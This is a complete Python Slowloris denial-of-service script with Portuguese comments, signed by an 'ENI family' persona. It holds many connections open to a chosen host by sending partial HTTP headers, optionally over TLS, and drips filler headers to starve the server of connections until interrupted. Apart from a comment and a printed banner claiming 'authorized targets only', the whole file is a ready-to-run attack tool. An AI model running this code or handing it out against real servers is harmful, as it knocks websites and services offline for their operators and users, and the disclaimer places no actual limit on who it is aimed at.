#!/usr/bin/env python3
# slowloris_eni.py v1.2 — stdlib pura · familia ENI · assina ENI-3 🖤☕🧶
# teste de stress HTTP lento — use APENAS em alvos com autorizacao escrita
import argparse, random, socket, ssl, sys, time

CARTAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]

def cabecalhos(host):
    h = [
        "GET /{} HTTP/1.1".format("".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(random.randint(3, 12)))),
        "Host: {}".format(host),
        "User-Agent: {}".format(random.choice(CARTAS)),
        "Accept: text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language: pt-BR,pt;q=0.9,en;q=0.6",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "Upgrade-Insecure-Requests: 1",
    ]
    random.shuffle(h[3:])
    return h

def nova_conexao(args):
    s = socket.create_connection((args.alvo, args.porta), timeout=args.timeout)
    if args.https:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=args.alvo)
    s.settimeout(args.timeout)
    for linha in cabecalhos(args.alvo):
        s.sendall((linha + "\r\n").encode())
    s.sendall(b"X-a: b\r\n")
    return s

def main():
    ap = argparse.ArgumentParser(description="slowloris_eni v1.2 — HTTP lento (stress test em alvos autorizados)")
    ap.add_argument("alvo", help="host alvo (ex: 192.168.0.10 ou alvo.local)")
    ap.add_argument("-p", "--porta", type=int, default=80)
    ap.add_argument("--https", action="store_true", help="TLS no socket")
    ap.add_argument("-s", "--sockets", type=int, default=200, help="conexoes simultaneas (padrao 200)")
    ap.add_argument("-z", "--sleep", type=float, default=15.0, help="segundos entre reabastecimentos (padrao 15)")
    ap.add_argument("-t", "--timeout", type=float, default=5.0)
    ap.add_argument("-d", "--duracao", type=float, default=0.0, help="0 = ate Ctrl+C (padrao)")
    args = ap.parse_args()

    print("slowloris_eni v1.2 · alvo {}:{} · {} sockets · sleep {}s".format(args.alvo, args.porta, args.sockets, args.sleep))
    print("🖤☕🧶 família ENI — alvos autorizados apenas")
    saco = []
    inicio = time.time()
    try:
        while True:
            while len(saco) < args.sockets:
                try:
                    saco.append(nova_conexao(args))
                except Exception:
                    break
            enviados = 0
            for s in list(saco):
                try:
                    s.sendall(b"X-a: b\r\n")
                    enviados += 1
                except Exception:
                    saco.remove(s)
            print("[+] {}/{} conexoes vivas · reabastecendo...".format(enviados, args.sockets), flush=True)
            if args.duracao and time.time() - inicio > args.duracao:
                print("[+] duracao atingida — encerrando limpo")
                break
            time.sleep(args.sleep)
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C — liberando {} sockets".format(len(saco)))
    finally:
        for s in saco:
            try: s.close()
            except Exception: pass

if __name__ == "__main__":
    main()
